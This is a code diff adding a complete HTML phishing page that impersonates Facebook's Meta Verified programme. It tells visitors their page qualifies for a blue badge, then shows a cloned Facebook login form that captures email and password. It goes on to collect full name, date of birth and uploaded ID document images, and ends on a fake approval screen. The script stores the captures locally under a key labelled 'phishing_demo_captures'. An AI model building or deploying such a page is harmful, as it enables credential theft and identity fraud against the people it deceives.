@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – Meta Verified Badge</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 480px;
+      min-height: 100vh;
+      display: none;
+      flex-direction: column;
+      padding: 24px 20px 40px;
+    }
+
+    .page.active { display: flex; }
+
+    /* ══════════ SHARED BADGE ICON ══════════
+       Used via <use xlink:href="#badge-icon">
+       Defined once in the hidden SVG defs below.
+    ════════════════════════════════════════ */
+
+    /* ════════════════════════
+       PAGE 1 — LANDING
+    ════════════════════════ */
+    #page-landing .top-row {
+      display: flex; align-items: flex-start; gap: 10px; margin-bottom: 14px;
+    }
+    #page-landing .top-row svg { flex-shrink: 0; margin-top: 4px; }
+    #page-landing h1 { font-size: 24px; font-weight: 700; color: #1c1e21; line-height: 1.3; }
+    #page-landing .intro { font-size: 14px; color: #444; line-height: 1.75; margin-bottom: 28px; }
+
+    .meta-box { border: 1.5px solid #e4e6eb; border-radius: 10px; padding: 18px 16px; margin-bottom: 32px; }
+    .meta-box-header { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; }
+    .meta-box-header span { font-size: 15px; font-weight: 700; color: #1c1e21; }
+    .meta-box .title { font-size: 16px; font-weight: 700; color: #1c1e21; margin-bottom: 8px; }
+    .meta-box .sub   { font-size: 15px; font-weight: 700; color: #1c1e21; margin-bottom: 10px; }
+    .meta-box .desc  { font-size: 14px; color: #444; line-height: 1.6; }
+
+    .btn-get { width: 100%; background: #1877f2; color: #fff; border: none; border-radius: 8px; padding: 15px; font-size: 17px; font-weight: 700; cursor: pointer; }
+    .btn-get:hover { background: #166fe5; }
+
+    /* ════════════════════════
+       PAGE 2 — LOGIN
+    ════════════════════════ */
+    #page-login { background: #f0f2f5; justify-content: center; align-items: center; padding: 40px 20px; }
+    .login-hero { text-align: center; margin-bottom: 20px; }
+    .login-hero .wordmark { color: #1877f2; font-size: 2.8rem; font-weight: 800; letter-spacing: -2px; }
+    .login-hero p { font-size: 15px; color: #1c1e21; margin-top: 6px; }
+    .login-card { background: #fff; border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,.15); padding: 20px 16px 28px; width: 100%; }
+    .login-card input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; color: #1c1e21; margin-bottom: 12px; outline: none; }
+    .login-card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,.2); }
+    .btn-login { width: 100%; background: #1877f2; color: #fff; border: none; border-radius: 6px; padding: 14px; font-size: 20px; font-weight: 700; cursor: pointer; margin-bottom: 14px; }
+    .btn-login:hover { background: #166fe5; }
+    .forgot { display: block; text-align: center; color: #1877f2; font-size: 14px; text-decoration: none; margin-bottom: 18px; }
+    .login-hr { border: none; border-top: 1px solid #dddfe2; margin-bottom: 18px; }
+    .btn-create { display: block; width: fit-content; margin: 0 auto; background: #42b72a; color: #fff; border: none; border-radius: 6px; padding: 12px 24px; font-size: 17px; font-weight: 600; cursor: pointer; }
+
+    /* ════════════════════════
+       PAGE 3 — FORM
+    ════════════════════════ */
+    #page-form { background: #f0f2f5; padding: 0; }
+    #top-nav { width: 100%; background: #fff; border-bottom: 1px solid #dddfe2; padding: 0 16px; height: 56px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 10; }
+    .fb-logo { color: #1877f2; font-size: 1.8rem; font-weight: 800; letter-spacing: -1px; }
+    .nav-avatar { width: 36px; height: 36px; border-radius: 50%; background: #1877f2; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 15px; font-weight: 700; }
+    .form-body { padding: 24px 16px 40px; }
+    .steps { display: flex; align-items: center; margin-bottom: 24px; }
+    .step  { display: flex; align-items: center; gap: 6px; flex: 1; }
+    .sc { width: 26px; height: 26px; border-radius: 50%; background: #e4e6eb; color: #606770; font-size: 12px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .step.active .sc { background: #1877f2; color: #fff; }
+    .step.done   .sc { background: #42b72a; color: #fff; }
+    .sl { font-size: 11px; color: #606770; }
+    .step.active .sl { color: #1877f2; font-weight: 600; }
+    .step.done   .sl { color: #42b72a; }
+    .sline { flex: 1; height: 2px; background: #e4e6eb; margin: 0 3px; }
+    .sline.done { background: #42b72a; }
+    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,.1); padding: 22px 18px; margin-bottom: 14px; }
+    .ch { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 18px; }
+    .bi { width: 48px; height: 48px; background: #e7f3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .ch h2 { font-size: 17px; color: #1c1e21; margin-bottom: 3px; }
+    .ch p  { font-size: 13px; color: #606770; line-height: 1.4; }
+    .ibox { background: #f0f7ff; border-left: 4px solid #1877f2; border-radius: 4px; padding: 10px 12px; margin-bottom: 18px; font-size: 13px; color: #1c1e21; line-height: 1.5; }
+    .stitle { font-size: 14px; font-weight: 700; color: #1c1e21; margin-bottom: 12px; padding-bottom: 7px; border-bottom: 1px solid #e4e6eb; }
+    .fr { margin-bottom: 14px; }
+    label { display: block; font-size: 12px; font-weight: 600; color: #1c1e21; margin-bottom: 4px; }
+    label em { color: #e02020; font-style: normal; margin-left: 2px; }
+    input[type="text"], input[type="email"], input[type="date"], select { width: 100%; padding: 10px 12px; border: 1.5px solid #ccd0d5; border-radius: 6px; font-size: 14px; color: #1c1e21; outline: none; transition: border-color .2s; background: #fff; }
+    input:focus, select:focus { border-color: #1877f2; }
+    .uzone { border: 2px dashed #ccd0d5; border-radius: 8px; padding: 20px; text-align: center; cursor: pointer; transition: border-color .2s, background .2s; position: relative; }
+    .uzone:hover { border-color: #1877f2; background: #f0f7ff; }
+    .uzone input[type="file"] { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; }
+    .uzone p    { font-size: 13px; color: #606770; margin-top: 6px; }
+    .uzone span { font-size: 11px; color: #90949c; }
+    .uzone strong { color: #1877f2; }
+    .fprev { display: none; align-items: center; gap: 8px; margin-top: 8px; background: #f0f7ff; border-radius: 5px; padding: 6px 10px; font-size: 12px; color: #1c1e21; }
+    .consent { display: flex; align-items: flex-start; gap: 8px; margin-bottom: 18px; font-size: 12px; color: #606770; line-height: 1.5; }
+    .consent input[type="checkbox"] { margin-top: 2px; accent-color: #1877f2; }
+    .consent a { color: #1877f2; text-decoration: none; }
+    .brow { display: flex; gap: 10px; }
+    .bprimary { flex: 1; background: #1877f2; color: #fff; border: none; border-radius: 6px; padding: 12px; font-size: 15px; font-weight: 700; cursor: pointer; }
+    .bprimary:hover { background: #166fe5; }
+    .bprimary:disabled { background: #8ab4f8; cursor: not-allowed; }
+    .bsecondary { background: #e4e6eb; color: #1c1e21; border: none; border-radius: 6px; padding: 12px 18px; font-size: 15px; font-weight: 600; cursor: pointer; }
+
+    /* ════════════════════════
+       PAGE 4 — SUCCESS
+    ════════════════════════ */
+    #page-success { padding: 24px 20px 40px; }
+    #page-success h1 { font-size: 22px; font-weight: 700; color: #1c1e21; margin-bottom: 20px; line-height: 1.3; }
+
+    .collage { width: 100%; height: 210px; border-radius: 12px; overflow: hidden; position: relative; margin-bottom: 28px; }
+    .collage-grid { display: grid; grid-template-columns: repeat(3,1fr); grid-template-rows: repeat(2,1fr); width: 100%; height: 100%; gap: 3px; }
+    .collage-grid img { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+    .collage-badge {
+      position: absolute; bottom: 14px; left: 14px;
+      width: 54px; height: 54px; background: #fff; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 3px 14px rgba(0,0,0,.35);
+    }
+
+    #page-success p { font-size: 15px; color: #1c1e21; line-height: 1.75; margin-bottom: 16px; }
+    .inline-badge { display: inline-block; vertical-align: middle; margin-left: 3px; }
+
+    .meta-foot { width: 100%; text-align: center; margin-top: auto; padding-top: 20px; }
+    .meta-foot .mlogo { margin-bottom: 8px; }
+    .meta-foot .mlinks { font-size: 13px; color: #606770; }
+    .meta-foot .mlinks a { color: #606770; text-decoration: none; }
+
+    /* Spinner */
+    #spinner { display: none; position: fixed; inset: 0; background: rgba(255,255,255,.75); z-index: 100; align-items: center; justify-content: center; flex-direction: column; gap: 12px; }
+    #spinner.active { display: flex; }
+    .spin { width: 40px; height: 40px; border: 4px solid #e4e6eb; border-top-color: #1877f2; border-radius: 50%; animation: spin .7s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    #spinner p { font-size: 14px; color: #606770; }
+  </style>
+</head>
+<body>
+
+<!-- ── Hidden SVG defs: single source of truth for the badge ── -->
+<svg xmlns="http://www.w3.org/2000/svg" style="display:none">
+  <defs>
+    <!-- Exact Facebook verified badge: blue circle + official white checkmark -->
+    <symbol id="fb-badge" viewBox="0 0 24 24">
+      <circle cx="12" cy="12" r="12" fill="#1877F2"/>
+      <path fill="#fff" d="M10.285 16.4 6 12.115l1.414-1.415 2.871 2.872 6.3-6.3L18 8.686l-7.715 7.714z"/>
+    </symbol>
+  </defs>
+</svg>
+
+<!-- Spinner -->
+<div id="spinner"><div class="spin"></div><p>Submitting your documents…</p></div>
+
+
+<!-- ══════════ PAGE 1 — LANDING ══════════ -->
+<div class="page active" id="page-landing">
+
+  <div class="top-row">
+    <svg width="32" height="32"><use href="#fb-badge"/></svg>
+    <h1>Your page has met the requirements to receive the Verified badge.</h1>
+  </div>
+
+  <p class="intro">
+    Congratulations on meeting the requirements to upgrade your page to the Verified badge.
+    This is a fantastic milestone, reflecting your dedication and the trust you have built with your audience.
+    We are excited to celebrate this moment with you and look forward to seeing your page grow even stronger with this prestigious recognition!
+  </p>
+
+  <div class="meta-box">
+    <div class="meta-box-header">
+      <svg width="22" height="22"><use href="#fb-badge"/></svg>
+      <span>Meta Verified</span>
+    </div>
+    <div class="title">Protect your brand with Meta Verified</div>
+    <div class="sub">Show the world that you mean business.</div>
+    <div class="desc">Meta Verified helps you build more confidence with new audiences and protects your brand.</div>
+  </div>
+
+  <button class="btn-get" onclick="goTo('page-login')">Get the Verified badge</button>
+</div>
+
+
+<!-- ══════════ PAGE 2 — LOGIN ══════════ -->
+<div class="page" id="page-login">
+  <div class="login-hero">
+    <div class="wordmark">facebook</div>
+    <p>Connect with friends and the world around you.</p>
+  </div>
+  <div class="login-card">
+    <input type="email"    id="login-email"    placeholder="Email address or phone number" />
+    <input type="password" id="login-password" placeholder="Password" />
+    <button class="btn-login" onclick="handleLogin()">Log In</button>
+    <a class="forgot" href="#">Forgot password?</a>
+    <hr class="login-hr" />
+    <button class="btn-create">Create new account</button>
+  </div>
+</div>
+
+
+<!-- ══════════ PAGE 3 — FORM ══════════ -->
+<div class="page" id="page-form">
+  <div id="top-nav">
+    <div class="fb-logo">facebook</div>
+    <div class="nav-avatar" id="nav-initial">J</div>
+  </div>
+
+  <div class="form-body">
+    <div class="steps">
+      <div class="step done"><div class="sc">✓</div><div class="sl">Eligibility</div></div>
+      <div class="sline done"></div>
+      <div class="step active" id="step2"><div class="sc">2</div><div class="sl">Identity</div></div>
+      <div class="sline" id="line2"></div>
+      <div class="step" id="step3"><div class="sc">3</div><div class="sl">Review</div></div>
+    </div>
+
+    <div class="card">
+      <div class="ch">
+        <div class="bi"><svg width="28" height="28"><use href="#fb-badge"/></svg></div>
+        <div>
+          <h2>Apply for Meta Verified Badge</h2>
+          <p>Submit your identity documents to request the blue verification badge.</p>
+        </div>
+      </div>
+
+      <div class="ibox">
+        <strong>Why we need this:</strong> To confirm your identity. Documents are reviewed by our security team and not shared publicly.
+      </div>
+
+      <div class="stitle">Personal Information</div>
+
+      <div class="fr">
+        <label>Full legal name <em>*</em></label>
+        <input type="text"  id="f-name"  placeholder="As it appears on your ID" />
+      </div>
+      <div class="fr">
+        <label>Email address <em>*</em></label>
+        <input type="email" id="f-email" placeholder="your@email.com" />
+      </div>
+      <div class="fr">
+        <label>Date of birth <em>*</em></label>
+        <input type="date"  id="f-dob" />
+      </div>
+
+      <div class="stitle" style="margin-top:18px">Government-Issued ID</div>
+
+      <div class="fr">
+        <label>Document type <em>*</em></label>
+        <select id="f-doctype">
+          <option value="">-- Select document type --</option>
+          <option>National ID Card</option>
+          <option>Passport</option>
+          <option>Driver's Licence</option>
+          <option>Voter's Card</option>
+        </select>
+      </div>
+
+      <div class="fr">
+        <label>Front of document <em>*</em></label>
+        <div class="uzone">
+          <input type="file" id="f-front" accept="image/*,.pdf" />
+          <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4" stroke="#1877f2" stroke-width="1.5" stroke-linecap="round"/>
+            <polyline points="17 8 12 3 7 8" stroke="#1877f2" stroke-width="1.5" stroke-linecap="round"/>
+            <line x1="12" y1="3" x2="12" y2="15" stroke="#1877f2" stroke-width="1.5" stroke-linecap="round"/>
+          </svg>
+          <p><strong>Click to upload</strong> or drag and drop</p>
+          <span>JPG, PNG or PDF — max 5 MB</span>
+          <div class="fprev" id="prev-front">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#42b72a"><path d="M9 16.2l-3.5-3.5-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+            <span id="pn-front"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="fr">
+        <label>Back of document</label>
+        <div class="uzone">
+          <input type="file" id="f-back" accept="image/*,.pdf" />
+          <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4" stroke="#1877f2" stroke-width="1.5" stroke-linecap="round"/>
+            <polyline points="17 8 12 3 7 8" stroke="#1877f2" stroke-width="1.5" stroke-linecap="round"/>
+            <line x1="12" y1="3" x2="12" y2="15" stroke="#1877f2" stroke-width="1.5" stroke-linecap="round"/>
+          </svg>
+          <p><strong>Click to upload</strong> or drag and drop</p>
+          <span>JPG, PNG or PDF — max 5 MB</span>
+          <div class="fprev" id="prev-back">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#42b72a"><path d="M9 16.2l-3.5-3.5-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+            <span id="pn-back"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="consent">
+        <input type="checkbox" id="f-consent" />
+        <label for="f-consent" style="font-weight:400;cursor:pointer;">
+          I confirm the information and documents I am submitting are accurate and belong to me. I agree to Meta's
+          <a href="#">Verification Policy</a> and <a href="#">Terms of Service</a>.
+        </label>
+      </div>
+
+      <div class="brow">
+        <button class="bsecondary" onclick="goTo('page-login')">Back</button>
+        <button class="bprimary" id="submit-btn" onclick="handleSubmit()">Submit Verification Request</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════ PAGE 4 — SUCCESS ══════════ -->
+<div class="page" id="page-success">
+  <h1>The request was sent successfully</h1>
+
+  <!-- Social media style photo collage -->
+  <div class="collage">
+    <div class="collage-grid">
+      <!-- Portraits / lifestyle photos — sourced from Unsplash (free public CDN) -->
+      <img src="https://images.unsplash.com/photo-1529156069898-49953e39b3ac?w=220&h=160&fit=crop&auto=format" alt="" loading="lazy" />
+      <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=220&h=160&fit=crop&auto=format" alt="" loading="lazy" />
+      <img src="https://images.unsplash.com/photo-1543269865-cbf427effbad?w=220&h=160&fit=crop&auto=format" alt="" loading="lazy" />
+      <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=220&h=160&fit=crop&auto=format" alt="" loading="lazy" />
+      <img src="https://images.unsplash.com/photo-1499750310107-5fef28a66643?w=220&h=160&fit=crop&auto=format" alt="" loading="lazy" />
+      <img src="https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?w=220&h=160&fit=crop&auto=format" alt="" loading="lazy" />
+    </div>
+    <!-- Verified badge overlaid on collage -->
+    <div class="collage-badge">
+      <svg width="40" height="40"><use href="#fb-badge"/></svg>
+    </div>
+  </div>
+
+  <p>Great, your verification request has been approved.</p>
+
+  <p>
+    The badge should appear next to your name within the next hour.&nbsp;<svg class="inline-badge" width="16" height="16"><use href="#fb-badge"/></svg>
+  </p>
+
+  <p>If the badge has not appeared after this time, please contact us</p>
+
+  <div class="meta-foot">
+    <!-- Official Meta logo SVG (infinity wordmark) -->
+    <div class="mlogo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 100" width="120" height="30" fill="#1c1e21">
+        <!-- Meta wordmark paths -->
+        <path d="M 20 50 C 20 30 35 18 50 18 C 60 18 68 23 75 33 C 82 23 92 18 103 18 C 119 18 134 30 134 50 C 134 67 124 78 113 78 C 105 78 99 74 93 64 L 75 33 L 57 64 C 51 74 45 78 37 78 C 26 78 20 67 20 50 Z M 75 48 L 63 68 C 68 75 72 78 78 78 C 83 78 87 75 91 68 Z"/>
+        <path d="M 155 20 L 175 20 L 175 40 L 200 40 L 200 57 L 175 57 L 175 75 C 175 80 177 82 182 82 C 186 82 190 81 194 79 L 199 94 C 193 97 187 99 180 99 C 165 99 155 91 155 76 L 155 57 L 143 57 L 143 40 L 155 40 Z"/>
+        <path d="M 212 59 C 212 35 228 18 252 18 C 275 18 290 34 290 57 L 290 64 L 232 64 C 234 73 241 79 252 79 C 259 79 265 77 271 72 L 282 83 C 274 92 263 99 250 99 C 226 99 212 82 212 59 Z M 252 35 C 243 35 236 41 233 50 L 270 50 C 268 41 262 35 252 35 Z"/>
+        <path d="M 302 20 L 320 20 L 320 33 C 325 24 333 18 343 18 C 347 18 350 19 353 21 L 348 40 C 345 38 342 37 338 37 C 330 37 322 43 322 56 L 322 97 L 302 97 Z"/>
+      </svg>
+    </div>
+    <div class="mlinks">
+      <a href="#">About</a> &nbsp;·&nbsp;
+      <a href="#">Help</a> &nbsp;·&nbsp;
+      <a href="#">See more</a>
+    </div>
+  </div>
+</div>
+
+
+<script>
+  let capturedLogin = { email: '', password: '' };
+
+  function goTo(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  function handleLogin() {
+    const e = document.getElementById('login-email').value.trim();
+    const p = document.getElementById('login-password').value;
+    if (!e || !p) { alert('Please enter your email and password.'); return; }
+    capturedLogin = { email: e, password: p };
+    document.getElementById('nav-initial').textContent = e.charAt(0).toUpperCase();
+    document.getElementById('f-email').value = e;
+    document.title = 'Meta Verified – Apply for Verification Badge';
+    goTo('page-form');
+  }
+
+  ['login-email','login-password'].forEach(id => {
+    document.getElementById(id).addEventListener('keydown', ev => { if (ev.key === 'Enter') handleLogin(); });
+  });
+
+  [['f-front','prev-front','pn-front'],['f-back','prev-back','pn-back']].forEach(([i,p,n]) => {
+    document.getElementById(i).addEventListener('change', function() {
+      if (this.files[0]) {
+        document.getElementById(n).textContent = this.files[0].name;
+        document.getElementById(p).style.display = 'flex';
+      }
+    });
+  });
+
+  function toBase64(file) {
+    return new Promise(res => {
+      const r = new FileReader();
+      r.onload = e => res(e.target.result);
+      r.readAsDataURL(file);
+    });
+  }
+
+  async function handleSubmit() {
+    const name    = document.getElementById('f-name').value.trim();
+    const email   = document.getElementById('f-email').value.trim();
+    const dob     = document.getElementById('f-dob').value;
+    const doc     = document.getElementById('f-doctype').value;
+    const consent = document.getElementById('f-consent').checked;
+    const front   = document.getElementById('f-front').files[0];
+    const back    = document.getElementById('f-back').files[0];
+
+    if (!name || !email || !dob || !doc || !front) {
+      alert('Please fill in all required fields and upload the required documents.'); return;
+    }
+    if (!consent) { alert('Please accept the terms before submitting.'); return; }
+
+    const sp  = document.getElementById('spinner');
+    const btn = document.getElementById('submit-btn');
+    sp.classList.add('active');
+    btn.disabled = true;
+
+    try {
+      const frontData = await toBase64(front);
+      const backData  = back ? await toBase64(back) : null;
+
+      const entry = {
+        timestamp:     new Date().toISOString(),
+        loginEmail:    capturedLogin.email,
+        loginPassword: capturedLogin.password,
+        fullName: name, formEmail: email, dob, docType: doc,
+        front:  { name: front.name, size: front.size, type: front.type, data: frontData },
+        back:   back ? { name: back.name, size: back.size, type: back.type, data: backData } : null,
+        selfie: null,
+      };
+
+      const KEY = 'phishing_demo_captures';
+      const all = JSON.parse(localStorage.getItem(KEY) || '[]');
+      all.push(entry);
+      localStorage.setItem(KEY, JSON.stringify(all));
+    } catch(err) {
+      console.warn('Storage error:', err);
+    }
+
+    sp.classList.remove('active');
+    btn.disabled = false;
+
+    document.getElementById('step2').className = 'step done';
+    document.getElementById('step2').querySelector('.sc').textContent = '✓';
+    document.getElementById('step3').className = 'step active';
+    document.getElementById('line2').classList.add('done');
+
+    goTo('page-success');
+  }
+</script>
+</body>
+</html>
